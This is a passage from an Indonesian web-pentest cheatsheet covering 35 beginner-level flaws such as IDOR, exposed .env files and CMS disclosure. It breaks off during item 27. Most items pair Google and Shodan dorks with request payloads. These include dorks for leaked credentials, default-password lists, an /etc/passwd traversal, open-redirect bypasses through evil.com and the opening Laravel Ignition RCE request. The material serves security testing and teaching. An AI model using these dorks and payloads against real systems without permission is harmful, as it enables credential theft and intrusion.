# 🟢 PoC CHEATSHEET — LEVEL LOW (Pemula)

> **Author**: TangselSecTeam | **Last Updated**: May 2026
> ⚠️ **Hanya untuk tujuan pendidikan & ethical hacking dengan izin tertulis.**

---

## 📑 Daftar PoC Level Low (35 Item)

| # | Nama PoC | Kategori | Bukti Berhasil |
|---|----------|----------|----------------|
| 1 | IDOR Basic | Broken Access Control | Data user lain terlihat |
| 2 | Information Disclosure | Security Misconfiguration | Screenshot error/detail server |
| 3 | Directory Listing | Security Misconfiguration | Daftar file muncul di browser |
| 4 | Default Credential | Auth Failures | Berhasil masuk dashboard |
| 5 | Weak Password Policy | Auth Failures | Akun dibuat dengan password lemah |
| 6 | Username Enumeration | Auth Failures | Perbedaan pesan error terlihat |
| 7 | Missing Security Header | Security Misconfiguration | Header tidak ada |
| 8 | Cookie Without HttpOnly | Session Security | Cookie tanpa HttpOnly |
| 9 | Cookie Without Secure | Session Security | Cookie tanpa Secure |
| 10 | Cookie Without SameSite | Session Security | Cookie tanpa SameSite |
| 11 | Verbose Error Message | Information Disclosure | Error database/framework muncul |
| 12 | Exposed Admin Page | Broken Access Control | Halaman admin terbuka |
| 13 | Public Backup File | Sensitive Data Exposure | File backup bisa diakses |
| 14 | HTML Comment Disclosure | Information Disclosure | Komentar sensitif ditemukan |
| 15 | Robots.txt Disclosure | Information Disclosure | Path sensitif ditemukan |
| 16 | Weak Logout | Session Management | Halaman masih bisa diakses |
| 17 | Cache Sensitive Page | Security Misconfiguration | Data terlihat setelah logout/back |
| 18 | Open Redirect Basic | Broken Access Control | Browser redirect ke URL lain |
| 19 | CORS Misconfiguration | Security Misconfiguration | Origin tidak semestinya diterima |
| 20 | Exposed API Documentation | Information Disclosure | Endpoint API terlihat |
| 21 | PHP Error & Debug Exposure | 🏷️ Framework Disclosure | phpinfo/debug output terlihat |
| 22 | Laravel Debug & .env Exposure | 🏷️ Framework Disclosure | APP_KEY/.env terbaca |
| 23 | WordPress Disclosure | 🏷️ CMS Disclosure | Versi/user/plugin terekspos |
| 24 | Joomla Disclosure | 🏷️ CMS Disclosure | Versi/config terekspos |
| 25 | Moodle / LMS Disclosure | 🏷️ CMS Disclosure | Versi/user terekspos |
| 26 | React / Next.js Source Map | 🏷️ Framework Disclosure | Source code terbaca |
| 27 | .env File Exposure | Sensitive Data Exposure | Credentials di .env terbaca |
| 28 | Git Repository Exposure | Sensitive Data Exposure | Source code dari .git terbaca |
| 29 | phpinfo() Exposure | Information Disclosure | PHP config lengkap terlihat |
| 30 | Server Status/Monitor Pages | Information Disclosure | Status server terbuka |
| 31 | Database Admin Panel Exposure | Security Misconfiguration | phpMyAdmin/Adminer terbuka |
| 32 | Source Code Disclosure | Sensitive Data Exposure | Source code terbaca |
| 33 | SSL/TLS Misconfiguration | Security Misconfiguration | Cipher/protocol lemah |
| 34 | Drupal / CMS Generic Disclosure | 🏷️ CMS Disclosure | Versi CMS terekspos |
| 35 | Stack Trace & Error Code Exposure | Information Disclosure | Full stack trace terlihat |

---

# 1. IDOR Basic

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Mengubah id user/order/profile untuk melihat data milik user lain

## Dork
```
# Google Dork
inurl:"/api/users/" | inurl:"/api/user/" | inurl:"/api/profile/"
inurl:"/api/" inurl:"id=" | inurl:"user_id=" | inurl:"order_id="
inurl:"/profile/" inurl:"?id=" ext:php

# Shodan
http.html:"swagger" | http.html:"api-docs" port:80,443
http.title:"Swagger UI" port:80,443,8080
```

## Langkah

```bash
# 1. Login sebagai user A, akses profil sendiri
GET /api/users/1001/profile
Authorization: Bearer TOKEN_USER_A

# 2. Ganti ID → ID user lain
GET /api/users/1002/profile
GET /api/users/1003/profile

# 3. Cek juga di parameter, body, dan path
GET /api/orders?user_id=1002
POST /api/profile  {"id": 1002}
```

## Bukti

- Response menampilkan data (nama, email, alamat) milik user lain
- Screenshot: response 200 OK dengan data berbeda dari akun sendiri

---

# 2. Information Disclosure

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Menemukan error message, versi server, path, stack trace

## Dork
```
# Google Dork
intext:"Warning: mysql" | intext:"Fatal error" | intext:"Stack trace" ext:php
intext:"SQLSTATE" | intext:"PDOException" | intext:"Uncaught Exception"
intext:"X-Powered-By" | intext:"Server:" site:target.com

# Shodan
"X-Powered-By: PHP" port:80
"Server: Apache" "X-Powered-By" port:80
```

## Langkah

```bash
# Trigger error dengan input tidak valid
GET /api/users/'
GET /api/users/../../../etc/passwd
GET /api/users/99999999
POST /login {"user":"admin","pass":[]}}

# Cek response header
curl -I https://target.com
# Lihat: Server, X-Powered-By, X-AspNet-Version
```

## Bukti

- Header `Server: Apache/2.4.41`, `X-Powered-By: PHP/7.4`
- Stack trace / error SQL muncul di response body

---

# 3. Directory Listing

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Folder bisa dibuka langsung dan menampilkan daftar file

## Dork
```
# Google Dork
intitle:"Index of /" | intitle:"Directory listing" | intitle:"Index of /uploads"
intitle:"Index of /backup" | intitle:"Index of /config"
intitle:"Index of" inurl:"/images" | inurl:"/uploads" | inurl:"/files"
site:target.com intitle:"Index of"

# Shodan
http.title:"Index of /" port:80,443
http.html:"Directory listing" port:80
```

## Langkah

```bash
# Akses folder umum
curl https://target.com/images/
curl https://target.com/uploads/
curl https://target.com/assets/
curl https://target.com/backup/
curl https://target.com/static/

# Nuclei
nuclei -u https://target.com -tags listing
```

## Bukti

- Browser menampilkan "Index of /uploads/" dengan daftar file
- Screenshot halaman directory listing

---

# 4. Default Credential

**Kategori**: Identification & Authentication Failures | **OWASP**: A07  
**Tujuan**: Login memakai akun default lab

## Dork
```
# Google Dork
intitle:"Login" intext:"admin" | intext:"default password"
inurl:"/admin" intitle:"Login" | intitle:"Dashboard"
intext:"default credentials" | intext:"factory reset password"

# Shodan
http.title:"Login" "admin" port:80,443,8080
http.title:"Grafana" port:3000
http.title:"Jenkins" port:8080
http.title:"Tomcat" port:8080
```

## Langkah

```bash
# Coba kombinasi default
admin:admin
admin:password
admin:123456
root:root
test:test
administrator:admin
guest:guest

# CMS specific
# WordPress: admin:admin
# Tomcat: tomcat:tomcat, admin:s3cret
# phpMyAdmin: root:(empty)
# Jenkins: admin:admin
# Grafana: admin:admin
```

## Bukti

- Berhasil masuk dashboard/panel admin
- Screenshot halaman dashboard setelah login

---

# 5. Weak Password Policy

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Sistem menerima password yang terlalu lemah

## Dork
```
# Google Dork
inurl:"/register" | inurl:"/signup" | inurl:"/create-account" ext:php
inurl:"register" intext:"password" -intext:"minimum" -intext:"8 characters"

# Shodan
http.html:"register" http.html:"password" port:80,443
```

## Langkah

```bash
# Coba registrasi dengan password lemah
POST /api/register
{"username":"testuser","password":"123"}
{"username":"testuser","password":"a"}
{"username":"testuser","password":"password"}
{"username":"testuser","password":"1"}

# Cek: apakah ada validasi panjang, kompleksitas, dictionary check?
```

## Bukti

- Akun berhasil dibuat dengan password "123" atau "a"
- Tidak ada pesan error tentang password policy

---

# 6. Username Enumeration

**Kategori**: Authentication Failure | **OWASP**: A07  
**Tujuan**: Pesan login berbeda antara username benar vs salah

## Dork
```
# Google Dork
inurl:"/login" | inurl:"/signin" ext:php
intext:"user not found" | intext:"invalid username" | intext:"does not exist"

# Shodan
http.title:"Login" port:80,443
```

## Langkah

```bash
# Login dengan username yang TIDAK ada
POST /login {"user":"tidakada123","pass":"xxx"}
# Response: "Username not found" atau "User does not exist"

# Login dengan username yang ADA tapi password salah
POST /login {"user":"admin","pass":"xxx"}
# Response: "Incorrect password" atau "Wrong password"

# Bandingkan: response code, body, timing, header
```

## Bukti

- Pesan error berbeda → attacker tahu username mana yang valid
- Screenshot perbandingan 2 response

---

# 7. Missing Security Header

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Mengecek header keamanan seperti CSP, HSTS, X-Frame-Options

## Dork
```
# Google Dork
site:target.com -intext:"Content-Security-Policy" -intext:"X-Frame-Options"

# Shodan
-"Strict-Transport-Security" port:443
-"X-Frame-Options" -"Content-Security-Policy" port:80,443

# Online Tool
# https://securityheaders.com/?q=target.com
```

## Langkah

```bash
# Cek semua security headers
curl -I https://target.com

# Yang harus ada:
# Strict-Transport-Security: max-age=31536000; includeSubDomains
# Content-Security-Policy: default-src 'self'
# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# Referrer-Policy: no-referrer
# Permissions-Policy: camera=(), microphone=()

# Tool online: https://securityheaders.com
# Nuclei
nuclei -u https://target.com -tags header,misconfig
```

## Bukti

- Header keamanan tidak ada di response
- Screenshot dari curl -I atau securityheaders.com

---

# 8. Cookie Without HttpOnly

**Kategori**: Session Security | **OWASP**: A07  
**Tujuan**: Mengecek apakah cookie session memakai flag HttpOnly

## Dork
```
# Google Dork
site:target.com intext:"Set-Cookie" -intext:"HttpOnly"

# Shodan
http.html:"Set-Cookie" -"HttpOnly" port:80,443
```

## Langkah

```bash
# Cek Set-Cookie header
curl -I https://target.com/login -c -

# Atau di browser DevTools → Application → Cookies
# Kolom HttpOnly harus ✓

# Test: apakah JS bisa baca cookie?
# Di browser console:
# document.cookie
# Jika session cookie muncul → TIDAK ada HttpOnly
```

## Bukti

- `Set-Cookie: session=abc123;` tanpa flag `HttpOnly`
- `document.cookie` di console menampilkan session token

---

# 9. Cookie Without Secure

**Kategori**: Session Security | **OWASP**: A07  
**Tujuan**: Cookie dikirim lewat HTTP (tidak hanya HTTPS)

## Dork
```
# Google Dork
site:target.com intext:"Set-Cookie" -intext:"Secure"

# Shodan
http.html:"Set-Cookie" -"Secure" port:80
```

## Langkah

```bash
# Cek Set-Cookie
curl -I https://target.com -c -
# Lihat apakah ada flag "Secure"

# Test: akses via HTTP
curl -I http://target.com -c -
# Jika cookie dikirim → rentan sniffing
```

## Bukti

- `Set-Cookie: session=abc123;` tanpa flag `Secure`
- Cookie tetap dikirim pada koneksi HTTP

---

# 10. Cookie Without SameSite

**Kategori**: Session Security | **OWASP**: A07  
**Tujuan**: Mengecek proteksi CSRF dasar via SameSite attribute

## Dork
```
# Google Dork
site:target.com intext:"Set-Cookie" -intext:"SameSite"

# Shodan
http.html:"Set-Cookie" -"SameSite" port:80,443
```

## Langkah

```bash
# Cek Set-Cookie
curl -I https://target.com -c -
# Lihat apakah ada SameSite=Strict atau SameSite=Lax

# Jika SameSite=None atau tidak ada → rentan CSRF
```

## Bukti

- `Set-Cookie: session=abc123;` tanpa `SameSite` attribute
- Atau `SameSite=None` tanpa justifikasi

---

# 11. Verbose Error Message

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Input salah memunculkan detail internal (DB, framework, path)

## Dork
```
# Google Dork
intext:"SQLSTATE" | intext:"Uncaught Exception" | intext:"Stack trace"
intext:"Fatal error" intext:"/var/www/" | intext:"C:\\xampp"
intext:"mysql_fetch" | intext:"pg_query" | intext:"ORA-"

# Shodan
http.html:"stack trace" port:80,443
http.html:"SQLSTATE" port:80
```

## Langkah

```bash
# Trigger error
GET /api/users/'           # SQL error
GET /api/search?q=<>{}     # Parser error
POST /api/data {"id":null} # Type error
GET /nonexistent-page      # 404 dengan stack trace

# Cek error detail:
# - Nama database / table
# - Stack trace (file path, line number)
# - Framework version
# - SQL query structure
```

## Bukti

- Error: `SQLSTATE[42000]: Syntax error...`
- Stack trace menampilkan `/var/www/html/app/Models/User.php:45`

---

# 12. Exposed Admin Page

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Menemukan halaman admin yang terbuka tanpa autentikasi

## Dork
```
# Google Dork
inurl:"/admin" | inurl:"/dashboard" | inurl:"/panel" -"login"
intitle:"Dashboard" -"login" -"sign in" site:target.com
inurl:"/wp-admin" | inurl:"/administrator" | inurl:"/cpanel"

# Shodan
http.title:"Dashboard" -"login" port:80,443,8080
http.title:"Admin" http.status:200 port:80
```

## Langkah

```bash
# Brute-force path admin
GET /admin
GET /administrator
GET /dashboard
GET /panel
GET /manage
GET /cms
GET /wp-admin
GET /cpanel

# Tool
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200,301,302
gobuster dir -u https://target.com -w common.txt
```

## Bukti

- Halaman admin/dashboard terbuka tanpa login
- Screenshot halaman admin yang bisa diakses

---

# 13. Public Backup File

**Kategori**: Sensitive Data Exposure | **OWASP**: A02  
**Tujuan**: Menemukan file .bak, .old, .zip yang bisa diakses publik

## Dork
```
# Google Dork
site:target.com filetype:sql | filetype:bak | filetype:old | filetype:zip
site:target.com ext:sql | ext:bak | ext:tar.gz | ext:7z
inurl:"backup" | inurl:".bak" | inurl:".old" site:target.com
intitle:"Index of" intext:".sql" | intext:".bak" | intext:".zip"

# Shodan
http.html:".sql" http.title:"Index of" port:80
```

## Langkah

```bash
# Cek file backup umum
GET /backup.sql
GET /backup.zip
GET /backup.tar.gz
GET /database.sql
GET /config.php.bak
GET /config.php.old
GET /web.config.bak
GET /.env.bak
GET /site.zip

# ffuf
ffuf -u https://target.com/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .bak,.old,.zip,.sql,.tar.gz -mc 200
```

## Bukti

- File backup bisa didownload (200 OK)
- Isi file mengandung credential / konfigurasi sensitif

---

# 14. HTML Comment Disclosure

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Melihat komentar HTML berisi endpoint, token, atau info sensitif

## Dork
```
# Google Dork
site:target.com intext:"<!--" intext:"password" | intext:"token" | intext:"TODO"
site:target.com intext:"<!--" intext:"api" | intext:"admin" | intext:"secret"

# Shodan
http.html:"<!-- TODO" port:80,443
http.html:"<!-- password" port:80,443
```

## Langkah

```bash
# View page source
curl -s https://target.com | grep -E "<!--|-->"

# Cari pattern sensitif
curl -s https://target.com | grep -iE "TODO|FIXME|password|token|api|secret|admin|endpoint"

# Browser: Ctrl+U → cari "<!--"
```

## Bukti

- Komentar: `<!-- API endpoint: /api/v2/internal/users -->`
- Komentar: `<!-- TODO: remove hardcoded password admin123 -->`

---

# 15. Robots.txt Disclosure

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Melihat endpoint tersembunyi di robots.txt

## Dork
```
# Google Dork
site:target.com inurl:"robots.txt"
site:target.com inurl:"robots.txt" intext:"Disallow" intext:"admin" | intext:"backup"

# Shodan
http.robots_hash:HASH  # Specific robots.txt hash
```

## Langkah

```bash
curl https://target.com/robots.txt

# Cari Disallow path yang menarik:
# Disallow: /admin/
# Disallow: /api/internal/
# Disallow: /backup/
# Disallow: /config/
# Disallow: /debug/

# Akses path yang di-disallow
curl https://target.com/admin/
curl https://target.com/api/internal/
```

## Bukti

- `robots.txt` memuat path sensitif (`/admin/`, `/backup/`)
- Path tersebut bisa diakses langsung

---

# 16. Weak Logout

**Kategori**: Session Management | **OWASP**: A07  
**Tujuan**: Session tidak di-invalidasi setelah logout

## Dork
```
# Google Dork
inurl:"/logout" | inurl:"/signout" | inurl:"/sign-out" ext:php

# Shodan
http.html:"logout" http.html:"session" port:80,443
```

## Langkah

```bash
# 1. Login → catat session token/cookie
# 2. Klik Logout
# 3. Tekan tombol Back di browser
# 4. Cek apakah halaman masih terbuka

# Atau: gunakan token lama setelah logout
curl -H "Cookie: session=OLD_TOKEN" https://target.com/dashboard
# Jika masih 200 OK → session tidak di-invalidate server-side
```

## Bukti

- Setelah logout + back → halaman dashboard masih muncul
- Token lama masih diterima server

---

# 17. Cache Sensitive Page

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Data sensitif tersimpan di cache browser

## Dork
```
# Google Dork
site:target.com inurl:"dashboard" | inurl:"profile" | inurl:"account"

# Shodan
-"Cache-Control: no-store" port:80,443
```

## Langkah

```bash
# Cek response header
curl -I https://target.com/dashboard
# Harus ada:
# Cache-Control: no-store, no-cache, must-revalidate
# Pragma: no-cache

# Test:
# 1. Login → buka halaman sensitif (profil, dashboard)
# 2. Logout
# 3. Tekan Back → apakah data masih muncul dari cache?

# Jika tidak ada Cache-Control: no-store → data bisa di-cache
```

## Bukti

- Header `Cache-Control` tidak ada atau tidak mencegah caching
- Data sensitif terlihat setelah logout + back

---

# 18. Open Redirect Basic

**Kategori**: Broken Access Control | **OWASP**: A01  
**Tujuan**: Parameter redirect bisa diarahkan ke domain lain

## Dork
```
# Google Dork
inurl:"redirect=" | inurl:"next=" | inurl:"url=" | inurl:"goto=" site:target.com
inurl:"return_to=" | inurl:"returnUrl=" | inurl:"dest=" ext:php
inurl:"login" inurl:"redirect" | inurl:"next"

# Shodan
http.html:"redirect" http.html:"login" port:80,443
```

## Langkah

```bash
# Cari parameter redirect
GET /login?redirect=https://evil.com
GET /login?next=https://evil.com
GET /login?url=https://evil.com
GET /login?return=https://evil.com
GET /login?returnTo=https://evil.com
GET /login?goto=https://evil.com
GET /logout?redirect=https://evil.com

# Bypass filter
/login?redirect=//evil.com
/login?redirect=https://target.com.evil.com
/login?redirect=https://evil.com%23.target.com
/login?redirect=////evil.com
/login?redirect=https://evil.com\@target.com
```

## Bukti

- Browser redirect ke domain external setelah login/action
- URL bar berubah ke domain attacker

---

# 19. CORS Misconfiguration Basic

**Kategori**: Security Misconfiguration | **OWASP**: A05  
**Tujuan**: Origin policy terlalu bebas

## Dork
```
# Google Dork
inurl:"/api/" intext:"Access-Control-Allow-Origin: *"
site:target.com inurl:"/api/" | inurl:"/rest/"

# Shodan
http.html:"Access-Control-Allow-Origin: *" port:80,443
http.html:"Access-Control-Allow-Credentials: true" port:80,443
```

## Langkah

```bash
# Test origin reflection
curl -I -H "Origin: https://evil.com" https://target.com/api/data
# Cek response:
# Access-Control-Allow-Origin: https://evil.com  → VULN
# Access-Control-Allow-Credentials: true         → CRITICAL

# Test null origin
curl -I -H "Origin: null" https://target.com/api/data

# Test wildcard
# Access-Control-Allow-Origin: *  → Rentan (tanpa credential)
```

## Bukti

- Response header `Access-Control-Allow-Origin` reflect origin attacker
- Atau wildcard `*` dengan data sensitif

---

# 20. Exposed API Documentation

**Kategori**: Information Disclosure | **OWASP**: A05  
**Tujuan**: Swagger/API docs terbuka tanpa autentikasi

## Dork
```
# Google Dork
inurl:"swagger-ui" | inurl:"api-docs" | inurl:"swagger.json"
inurl:"/graphql" | inurl:"/graphiql" | inurl:"/playground"
intitle:"Swagger UI" | intitle:"API Documentation"
site:target.com inurl:"docs" | inurl:"api"

# Shodan
http.title:"Swagger UI" port:80,443,8080
http.html:"openapi" | http.html:"swagger" port:80,443
```

## Langkah

```bash
# Cek endpoint dokumentasi API
GET /swagger
GET /swagger-ui.html
GET /swagger-ui/
GET /api-docs
GET /api/docs
GET /docs
GET /redoc
GET /graphql (GraphQL Playground)
GET /graphiql
GET /.well-known/openapi.json
GET /openapi.json
GET /v2/api-docs
GET /v3/api-docs

# Nuclei
nuclei -u https://target.com -tags swagger,api-docs
```

## Bukti

- Swagger UI terbuka menampilkan semua endpoint API
- Endpoint internal/admin terlihat di dokumentasi

---

# 🏷️ FRAMEWORK & CMS SPECIFIC DISCLOSURE

---

# 21. PHP Error & Debug Mode Exposure

**Kategori**: 🏷️ Framework Disclosure | **OWASP**: A05  
**Tujuan**: PHP menampilkan error, warning, atau debug info ke user

## Dork
```
# Google Dork
intext:"Warning:" intext:"on line" ext:php
intext:"Fatal error" intext:"/var/www/" ext:php
inurl:"_profiler" | inurl:"_wdt"  # Symfony debug
inurl:"debug_kit"  # CakePHP

# Shodan
http.html:"Warning:" http.html:"on line" port:80
http.html:"Fatal error" port:80
```

## Langkah

```bash
# ===== Trigger PHP errors =====
GET /index.php?id[]=          # Array injection → warning
GET /index.php?page=<?php     # Syntax error
GET /page.php?file=nonexist   # Include error
POST /upload.php              # tanpa file → error

# ===== Cek display_errors =====
# Response berisi:
# Warning: include(nonexist.php): Failed to open stream...
# Fatal error: Uncaught Exception in /var/www/html/app.php:42
# Notice: Undefined variable: user in /var/www/html/index.php on line 15

# ===== PHP error di berbagai framework =====
# CodeIgniter
GET /index.php/nonexistent/method
# Response: "An Error Was Encountered" + stack trace

# Symfony
GET /_profiler/     # Symfony Profiler (debug mode)
GET /_wdt/          # Web Debug Toolbar

# CakePHP
GET /debug_kit/     # Debug Kit panel
```

## Bukti
- Full file path terlihat: `/var/www/html/app/Controllers/UserController.php`
- PHP version terlihat di error
- Stack trace dengan line number

---

# 22. Laravel Debug Mode & .env Exposure

**Kategori**: 🏷️ Framework Disclosure | **OWASP**: A05  
**Tujuan**: Laravel APP_DEBUG=true mengekspos config, .env, SQL query

## Dork
```
# Google Dork
intext:"Whoops!" intext:"APP_KEY" | intext:"DB_PASSWORD"  # Ignition error
inurl:".env" intext:"APP_KEY" | intext:"DB_PASSWORD" | intext:"MAIL_PASSWORD"
inurl:"telescope" | inurl:"horizon" | inurl:"_debugbar"
inurl:"storage/logs/laravel.log"

# Shodan
http.html:"APP_KEY" http.html:"Laravel" port:80,443
http.html:"Ignition" port:80,443
http.title:"Laravel" port:80,443
```

## Langkah

```bash
# ===== Laravel Debug Mode (Ignition error page) =====
# Trigger error apapun:
GET /api/nonexistent
GET /users/abc           # string di integer route
POST /api/login {}       # empty body
GET /page?id[]=test      # type error

# Debug page menampilkan:
# - APP_KEY, DB_PASSWORD, MAIL_PASSWORD
# - Full .env content
# - SQL queries
# - Full stack trace
# - Request/response headers

# ===== .env file langsung =====
GET /.env
GET /.env.backup
GET /.env.local
GET /.env.production
GET /.env.example      # kadang berisi real credentials

# ===== Laravel specific paths =====
GET /storage/logs/laravel.log    # Log file (bisa sangat besar)
GET /storage/                    # Directory listing
GET /telescope                   # Laravel Telescope (debug dashboard)
GET /horizon                     # Laravel Horizon (queue dashboard)
GET /_debugbar/open              # Laravel Debugbar

# ===== Artisan info =====
GET /artisan                     # Kadang ter-expose
# Response berisi list routes, config, dll

# ===== CVE-2021-3129: Laravel Ignition RCE =====
# Jika Laravel < 8.4.2 + Ignition < 2.5.2
POST /_ignition/execute-solution HTTP/1.1
Content-Type: application/json
{"solution":"Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution","parameters":{"variableName":"x","viewFile":"php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"}}
```

## Bukti
- Error page Ignition menampilkan APP_KEY, DB_PASSWORD
- File `.env` bisa didownload langsung
- Laravel Telescope/Debugbar terbuka

---

# 23. WordPress Information Disclosure

**Kategori**: 🏷️ CMS Disclosure | **OWASP**: A05  
**Tujuan**: Versi WP, username, plugin, theme terekspos

## Dork
```
# Google Dork
inurl:"wp-content/" | inurl:"wp-includes/" | inurl:"wp-admin/"
inurl:"wp-json/wp/v2/users"  # User enumeration
inurl:"wp-content/debug.log"  # Debug log
inurl:"wp-config.php.bak" | inurl:"wp-config.php.old"
site:target.com inurl:"wp-" | inurl:"wordpress"

# Shodan
http.html:"wp-content" port:80,443
http.html:"WordPress" port:80,443

# Tool
wpscan --url https://target.com --enumerate u,p,t
```

## Langkah

```bash
# ===== Versi WordPress =====
curl -s https://target.com | grep "generator"
# <meta name="generator" content="WordPress 6.5.2" />

curl -s https://target.com/feed/ | grep "generator"
curl -s https://target.com/readme.html    # WP readme file
curl -s https://target.com/license.txt

# ===== Username Enumeration =====
GET /wp-json/wp/v2/users          # REST API user list
GET /?author=1                     # Redirect ke /author/admin/
GET /?author=2
GET /wp-json/wp/v2/users?per_page=100

# ===== Plugin & Theme Detection =====
curl -s https://target.com | grep -oP 'wp-content/plugins/\K[^/]+'
curl -s https://target.com | grep -oP 'wp-content/themes/\K[^/]+'

# Plugin readme (versi info)
GET /wp-content/plugins/PLUGIN_NAME/readme.txt
GET /wp-content/plugins/akismet/readme.txt
GET /wp-content/plugins/contact-form-7/readme.txt

# ===== Sensitive WP Files =====
GET /wp-config.php               # biasanya blocked
GET /wp-config.php.bak           # backup!
GET /wp-config.php~              # editor temp
GET /wp-config.php.old
GET /wp-config.php.save
GET /wp-config.txt
GET /wp-admin/install.php        # Installation page
GET /wp-includes/version.php     # Version file

# ===== WP Debug Log =====
GET /wp-content/debug.log        # WP_DEBUG_LOG = true
# Berisi error, query, kadang credentials

# ===== WPScan (automated) =====
wpscan --url https://target.com --enumerate u,p,t
wpscan --url https://target.com --enumerate vp  # vulnerable plugins
wpscan --url https://target.com --api-token YOUR_TOKEN

# ===== XML-RPC =====
POST /xmlrpc.php
# Check if enabled → brute force, pingback DDoS
```

## Bukti
- Versi WordPress terlihat di source/feed
- Username list dari REST API
- Plugin versions dari readme.txt
- Screenshot wp-content/debug.log

---

# 24. Joomla Information Disclosure

**Kategori**: 🏷️ CMS Disclosure | **OWASP**: A05  
**Tujuan**: Versi Joomla, config, user info terekspos

## Dork
```
# Google Dork
inurl:"/administrator/" intitle:"Joomla" | intitle:"Administration"
inurl:"configuration.php.bak" | inurl:"configuration.php.old"
inurl:"/administrator/manifests/files/joomla.xml"
site:target.com intext:"Joomla!" | inurl:"com_"

# Shodan
http.html:"Joomla" port:80,443
http.title:"Administration - Joomla" port:80,443

# Tool
joomscan -u https://target.com
```

## Langkah

```bash
# ===== Versi Joomla =====
GET /administrator/manifests/files/joomla.xml
# <version>4.3.2</version>

GET /language/en-GB/en-GB.xml
GET /plugins/system/cache/cache.xml
GET /README.txt
GET /LICENSE.txt

# ===== Joomla Config =====
GET /configuration.php           # biasanya blocked
GET /configuration.php.bak       # backup!
GET /configuration.php~
GET /configuration.php.old
GET /configuration.php.dist

# ===== Admin & Registration =====
GET /administrator/              # Admin login page
GET /index.php?option=com_users&view=registration  # User registration

# ===== User Enumeration =====
GET /index.php?option=com_users&view=remind    # Password remind
GET /index.php?option=com_users&view=reset     # Password reset

# ===== Component Detection =====
GET /components/                 # Directory listing
GET /modules/
GET /plugins/
GET /templates/

# ===== Joomscan (automated) =====
joomscan -u https://target.com
```

## Bukti
- Versi Joomla terlihat di manifest XML
- Admin page terbuka di /administrator/
- Komponen/plugin versions terekspos

---

# 25. Moodle / LMS Information Disclosure

**Kategori**: 🏷️ CMS Disclosure | **OWASP**: A05  
**Tujuan**: Versi Moodle, konfigurasi, user terekspos

## Dork
```
# Google Dork
inurl:"/moodle/" | inurl:"mod/forum" | inurl:"course/view.php"
inurl:"/moodle/" intitle:"Log in" | intitle:"Moodle"
inurl:"/moodle/lib/upgrade.txt" | inurl:"/moodle/config-dist.php"
site:*.edu inurl:"moodle" | inurl:"lms"

# Shodan
http.html:"Moodle" port:80,443
http.title:"Moodle" port:80,443
```

## Langkah

```bash
# ===== Versi Moodle =====
GET /lib/upgrade.txt             # Changelog dengan versi
GET /admin/environment.xml       # Environment requirements
GET /composer.json               # Dependencies
GET /package.json

# ===== Config Files =====
GET /config.php                  # biasanya blocked
GET /config.php.bak
GET /config-dist.php             # Template config (bisa ada creds)

# ===== User Enumeration =====
GET /login/forgot_password.php   # "Email not found" vs "Email sent"
GET /user/profile.php?id=1       # User profile
GET /user/profile.php?id=2

# ===== Exposed Features =====
GET /admin/                      # Admin login
GET /theme/upgrade.txt           # Theme versions
GET /report/                     # Reports page
GET /backup/                     # Backup files

# ===== Moodle API =====
GET /webservice/rest/server.php  # REST API
GET /login/token.php             # Token endpoint
GET /lib/ajax/service.php        # AJAX service

# ===== Debug info =====
# Jika $CFG->debugdisplay = 1:
# Error pages menampilkan full stack trace + DB queries
```

## Bukti
- Versi Moodle dari upgrade.txt
- User profiles accessible via ID enumeration
- Config atau debug info terekspos

---

# 26. React / Next.js Source Map & Debug Disclosure

**Kategori**: 🏷️ Framework Disclosure | **OWASP**: A05  
**Tujuan**: Source map, environment variables, atau debug info terekspos

## Dork
```
# Google Dork
site:target.com ext:map inurl:".js.map"  # Source map files
inurl:"/_next/" | inurl:"/static/js/" inurl:".map"
inurl:"_buildManifest.js" | inurl:"_ssgManifest.js"  # Next.js
site:target.com intext:"REACT_APP_" | intext:"NEXT_PUBLIC_"

# Shodan
http.html:"__NEXT_DATA__" port:80,443  # Next.js
http.html:"ng-app" port:80,443  # AngularJS
http.html:"__VUE__" port:80,443  # Vue.js
```

## Langkah

```bash
# ===== Source Maps (React/Vue/Angular) =====
# Cari .map files di source JS
curl -s https://target.com/static/js/main.abc123.js | tail -1
# //# sourceMappingURL=main.abc123.js.map

# Download source map
GET /static/js/main.abc123.js.map
GET /_next/static/chunks/main-abc123.js.map    # Next.js
GET /static/js/bundle.js.map                    # CRA

# ===== Extract source code dari .map =====
# Tool: unwebpack-sourcemap, source-map-explorer
npx unwebpack-sourcemap main.abc123.js.map ./output/
# → Seluruh source code React terbaca!

# ===== Next.js Specific =====
GET /_next/data/BUILD_ID/page.json    # Server-side data
GET /api/                              # API routes
GET /_next/static/BUILD_ID/_buildManifest.js    # All routes exposed

# ===== Environment Variables di Client =====
# Di source JS, cari:
grep -oP 'REACT_APP_[A-Z_]+' main.js
grep -oP 'NEXT_PUBLIC_[A-Z_]+' main.js
# Bisa mengandung API keys, endpoints, secrets

# ===== React DevTools Detection =====
# Di browser console:
# __REACT_DEVTOOLS_GLOBAL_HOOK__ → React detected
# __NEXT_DATA__ → Next.js data

# ===== Vue.js =====
GET /js/app.js.map
# Di console: __VUE_DEVTOOLS_GLOBAL_HOOK__

# ===== Angular =====
GET /main.js.map
GET /polyfills.js.map
```

## Bukti
- Source map file bisa didownload
- Full React/Vue source code terbaca
- API keys / environment variables terekspos di client bundle

---

# 27. .env File Exposure (Generic)

**Kategori**: Sensitive Data Exposure | **OWASP**: A02  
**Tujuan**: File .env berisi credentials terbuka publik

## Dork
```
# Google Dork
inurl:".env" intext:"DB_PASSWORD" | intext:"APP_KEY" | intext:"SECRET_KEY"
inurl:".env" intext:"MAIL_PASSWORD" | intext:"AWS_SECRET" | intext:"API_KEY"
filetype:env intext:"DB_HOST" | intext:"DATABASE_URL"
